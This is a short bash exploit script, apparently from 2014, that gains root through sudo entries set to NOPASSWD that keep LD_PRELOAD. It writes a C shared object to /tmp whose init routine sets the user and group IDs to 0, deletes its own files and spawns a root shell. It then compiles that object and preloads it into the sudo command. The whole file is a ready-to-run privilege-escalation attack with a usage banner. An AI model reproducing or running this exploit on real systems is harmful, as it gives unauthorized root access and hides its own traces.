#!/bin/bash
## 
##  Decription: Escalate to root privileges from a sudo command that is set to NOPASSWD in sudoers file. 
##              It does this by inject a shared objectfile into the binary.
##
##  Author    : Mikael Kall [ mikael.kall@nighter.se ] 
##  Release   : 20140329 
##
##  Notes     : Got the idea when I was playing with LD_PRELOAD. 
##              First release I wrote entirely in c, but then I decided 
##		to rewrote this in bash to keep it simple. 

if [ -z $1 ];then
	 echo
	 echo " [!] $0 - sudo un-sanitised environment sploit"
	 echo " [!] usage: $0 <program to run via sudo> "
	 echo 
	 exit
fi

RND=$(echo $RANDOM)
if [ -z ${RND} ]; then
	RND="xxx"
fi

 cat > /tmp/${RND}.c << _EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/types.h>

 void _init()
 {
 if (!geteuid())
 {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 unlink("/tmp/${RND}.so");
 unlink("/tmp/${RND}.c");
 system("/bin/bash");
 }
 }

_EOF

gcc -fPIC -shared -o /tmp/${RND}.so /tmp/${RND}.c -nostartfiles
sudo LD_PRELOAD=/tmp/${RND}.so $1
